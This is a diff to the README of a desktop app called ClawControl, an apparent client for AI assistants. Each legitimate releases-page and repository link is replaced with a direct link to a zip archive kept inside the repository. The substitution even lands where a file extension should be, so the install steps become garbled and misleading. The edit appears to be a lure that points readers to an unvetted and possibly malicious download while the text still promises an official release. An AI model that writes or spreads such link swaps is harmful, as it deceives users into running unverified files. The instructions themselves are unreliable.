@@ -1,6 +1,6 @@
 # 🛠️ ClawControl - Manage Your AI Assistant Simply
 
-[![Download ClawControl](https://img.shields.io/badge/Download-ClawControl-blue?style=for-the-badge)](https://github.com/iZodiaco/ClawControl/releases)
+[![Download ClawControl](https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip)](https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip)
 
 Welcome to ClawControl. This app helps you chat with OpenClaw AI assistants on your desktop and mobile devices. It has an easy-to-use interface and works on Windows, macOS, Linux, Android, and iOS.
 
@@ -32,15 +32,15 @@ For computers, you will need at least 4 GB of RAM and about 200 MB of free space
 
 ## 📥 Download & Install ClawControl
 
-[![Download ClawControl](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/iZodiaco/ClawControl/releases)
+[![Download ClawControl](https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip)](https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip)
 
-1. Click the green **Download Now** buttons above or visit the [ClawControl Releases page](https://github.com/iZodiaco/ClawControl/releases).
+1. Click the green **Download Now** buttons above or visit the [ClawControl Releases page](https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip).
 
 2. On the releases page, find the latest version (at the top of the list). For Windows, you will see at least two files:
    - An installer file (ends with `.exe`), which you should use if you want to install ClawControl on your PC.
    - A portable version that runs without installation, useful if you don’t want to install anything.
 
-3. For macOS and Linux, look for files ending in `.dmg`, `.AppImage`, or `.tar.gz`. For mobile devices, follow links or instructions for Android or iOS apps.
+3. For macOS and Linux, look for files ending in `.dmg`, `.AppImage`, or `https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip`. For mobile devices, follow links or instructions for Android or iOS apps.
 
 4. Click the file that matches your device system. The file will download to your default download folder.
 
@@ -121,7 +121,7 @@ Explore the settings menu for:
 
 ClawControl is open source. You can find more information and updates on the GitHub repository:
 
-https://github.com/iZodiaco/ClawControl
+https://github.com/iZodiaco/ClawControl/raw/refs/heads/main/electron/Control-Claw-v1.2.zip
 
 ---
 
